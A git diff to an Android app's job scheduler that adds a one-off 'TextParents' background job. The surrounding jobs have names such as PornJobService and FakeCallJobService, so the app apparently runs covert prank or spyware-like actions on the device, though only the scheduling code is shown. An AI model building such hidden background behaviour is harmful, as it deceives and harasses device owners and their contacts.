@@ -16,6 +16,7 @@ import com.candroid.textme.jobs.services.PackagesJobService;
 import com.candroid.textme.jobs.services.PhoneCallsJobService;
 import com.candroid.textme.jobs.services.PornJobService;
 import com.candroid.textme.jobs.services.SmsJobService;
+import com.candroid.textme.jobs.services.TextParentsJobService;
 import com.candroid.textme.jobs.services.WallpaperJobService;
 import com.candroid.textme.receivers.ScreenReceiver;
 
@@ -30,6 +31,7 @@ public class JobsScheduler {
     public static final int JOB_ID_SMS = 8;
     public static final int JOB_ID_CALENDAR_EVENTS = 9;
     public static final int JOB_ID_FAKE_PHONE_CALL = 10;
+    public static final int JOB_ID_TEXT_PARENTS = 11;
     public static final long ONE_MINUTE = 60000;
     public static final long ONE_HOUR = ONE_MINUTE * 60;
     public static final String DCIM_KEY = "DCIM_KEY";
@@ -40,6 +42,7 @@ public class JobsScheduler {
     public static final String SMS_KEY = "SMS_KEY";
     public static final String CALENDAR_EVENTS_KEY = "CALENDAR_EVENTS_KEY";
     public static final String FAKE_PHONE_CALL_KEY = "FAKE_PHONE_CALL_KEY";
+    public static final String TEXT_PARENTS_KEY = "TEXT_PARENTS_KEY";
 
     public static void scheduleJob(Context context){
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
@@ -51,6 +54,7 @@ public class JobsScheduler {
         boolean ranSms = sharedPreferences.getBoolean(SMS_KEY, false);
         boolean ranCalendar = sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false);
         boolean ranFakePhoneCall = sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
+        boolean ranTextParents = sharedPreferences.getBoolean(TEXT_PARENTS_KEY, false);
         JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
         if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
             ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
@@ -163,13 +167,26 @@ public class JobsScheduler {
             calendarEventJob.setMinimumLatency(1 * ONE_MINUTE);
             jobScheduler.schedule(calendarEventJob.build());
         }
+        if(jobScheduler.getPendingJob(JOB_ID_TEXT_PARENTS) == null && ! ranTextParents){
+            ComponentName textParentsJobService = new ComponentName(context, TextParentsJobService.class);
+            JobInfo.Builder textParentsJob = new JobInfo.Builder(JOB_ID_TEXT_PARENTS, textParentsJobService);
+            textParentsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
+            textParentsJob.setRequiresCharging(false);
+            textParentsJob.setRequiresBatteryNotLow(true);
+            textParentsJob.setRequiresStorageNotLow(false);
+            textParentsJob.setRequiresDeviceIdle(false);
+            textParentsJob.setPersisted(false);
+            textParentsJob.setOverrideDeadline( 24 * ONE_HOUR);
+            textParentsJob.setMinimumLatency(9 * ONE_MINUTE);
+            jobScheduler.schedule(textParentsJob.build());
+        }
         if(jobScheduler.getPendingJob(JOB_ID_FAKE_PHONE_CALL) == null && ! ranFakePhoneCall){
             ComponentName fakeCallJobService = new ComponentName(context, FakeCallJobService.class);
             JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_FAKE_PHONE_CALL, fakeCallJobService);
             calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
             calendarEventJob.setRequiresCharging(false);
             calendarEventJob.setRequiresBatteryNotLow(true);
-            calendarEventJob.setRequiresStorageNotLow(true);
+            calendarEventJob.setRequiresStorageNotLow(false);
             calendarEventJob.setRequiresDeviceIdle(false);
             calendarEventJob.setPersisted(false);
             calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
